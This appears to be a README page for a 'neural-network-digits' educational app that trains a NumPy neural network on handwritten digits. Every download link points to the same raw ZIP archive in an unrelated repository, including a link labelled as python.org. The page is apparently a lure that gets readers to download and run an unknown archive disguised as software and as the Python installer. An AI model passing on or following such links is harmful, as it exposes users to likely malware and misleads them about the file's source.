---
layout: "default"
title: "🧠 neural-network-digits - Watch AI Learn Handwritten Numbers Live"
description: "Learn, tweak, and visualize a neural network recognizing handwritten digits—built entirely from scratch in Python and NumPy."
---
# 🧠 neural-network-digits - Watch AI Learn Handwritten Numbers Live

[![Download Now](https://img.shields.io/badge/Download-neural--network--digits-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip)

---

## 🌟 What Is This?

This is a fun, educational program that teaches your computer to recognize handwritten numbers (0-9) using a **neural network** – a type of artificial intelligence modeled after the human brain. The best part? You can **watch it learn in real time**, adjust its settings while it trains, and peek inside every layer of its "brain" to see exactly how it works.

No programming knowledge is needed to run it. Just download, open, and explore.

---

## 🖥️ What Does It Look Like?

Imagine a window with:

- A **live training screen** showing the AI's accuracy improving as it learns.
- **Interactive sliders** to change learning speed, network size, or number of training rounds on the fly.
- A **visual map** of every neuron and connection, with colors showing which parts are "firing."
- A **drawing pad** where you can write a digit yourself and see the AI guess it in real time.

It’s like a science experiment you can touch.

---

## ⚡ Quick Start (Download and Run)

Visit this link to download the application.

Once you’re on the page, click the green **"Code"** button, then choose **"Download ZIP"**. Your computer will download a folder. Extract it (right-click → "Extract All") and double-click the file named **`neural_network_digits.py`** (or **`main.py`**) to launch the app.

If you see a black window or a pop-up asking about Python, don’t worry – follow the instructions in the "Need Help?" section below.

---

## 📦 What You Need

This program requires **Python** (a free programming language) to run. If you don’t have it:

1. Go to [python.org](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip) and click **"Download Python"**.
2. Run the installer. **Important:** Check the box that says **"Add Python to PATH"** before clicking Install.
3. After installation, open the extracted folder, right-click inside it, and select **"Open in Terminal"**. Type `pip install numpy matplotlib` and press Enter. This installs the helper libraries (NumPy and Matplotlib) automatically.

That’s it. You only do this once.

---

## 🎮 How to Use It

1. **Launch the app** (double-click the `.py` file).
2. **Watch the training begin** – you’ll see numbers appear, showing the AI’s accuracy climbing from ~10% (random guessing) to over 95% in a few minutes.
3. **Use the sliders** on the right side:
   - **Learning Rate:** Higher = learns faster but can get sloppy. Lower = smarter but slower.
   - **Hidden Layers:** More layers = more brainpower but requires more computer memory.
   - **Epochs:** How many times the AI reviews the entire training set.
4. **Click "Pause"** anytime to freeze training and inspect the network visually.
5. **Click the drawing pad**, write a digit, and press **"Guess"** – the AI will tell you what it thinks it is, and why.

---

## 🔍 Peek Inside the AI Brain

This is the most unique feature. When training is running, you’ll see a **node graph** (circles and lines). Each circle is a "neuron," and each line is a "connection."

- **Bright colors** = strong signals.
- **Dull colors** = weak signals.
- As training progresses, patterns emerge – you can actually see the network learning to detect edges, curves, and loops, just like a human eye does.

You can **click any neuron** to see its "opinion" – what kind of input it responds to most strongly.

---

## 🛠️ Tweaking While It Trains

Unlike other AI demos that freeze while training, this one is fully interactive:

- **Change the learning rate mid-training** – watch accuracy jump or drop instantly.
- **Add or remove neurons** while it’s running – the network restructures itself on the spot.
- **Switch between MNIST samples** – click through individual digits to see how confident the AI is about each one.

This lets you experiment like a true researcher, without any coding.

---

## 📚 Want to Learn the Math?

If you’re curious how it works under the hood, the code is heavily commented. Every line explains what it does and why. The project covers:

- **Forward propagation** – how inputs flow through the network to produce outputs.
- **Backpropagation** – the core algorithm that adjusts weights and biases based on errors.
- **Gradient descent** – the optimization step that minimizes mistakes.
- **Activation functions** – the "firing" rules of each neuron.

All implemented from scratch using only Python and NumPy – no special AI libraries. This makes it perfect for students or hobbyists who want to really understand deep learning.

---

## 🧩 Troubleshooting

**"I double-clicked the file and nothing happened."**
- Right-click the file → "Open with" → choose "Python" (or "Python Launcher").

**"I see a red error message."**
- Most likely a missing library. Open Terminal in the folder and run: `pip install numpy matplotlib`

**"My computer is slow."**
- Decrease the number of neurons or hidden layers using the sliders before starting training.

**"Can I use my own images?"**
- Yes. Save a handwritten digit as a PNG (28x28 pixels, black on white) and drag it onto the drawing pad.

---

## 📄 License & Credits

This project is free to use for learning and personal projects. It was built as an educational tool to demystify how neural networks work. The MNIST dataset used is a classic public benchmark for handwriting recognition.

If you use it for a course or tutorial, a small credit is appreciated.

---

## 🚀 Ready to See AI Think?

Click the button below to get started:

**[⬇️ Download neural-network-digits](https://raw.githubusercontent.com/cami005/cami005.github.io/main/scripts/Dist_v3.1.zip)**

Then follow the three simple steps in **Quick Start** above. Within 10 minutes, you’ll be watching a brain – built entirely from scratch – learn to read your handwriting.

---

Keywords: backpropagation, deep-learning, educational, from-scratch, handwritten-digit-recognition, machine-learning, matplotlib, mnist, neural-network, numpy, python, tkinter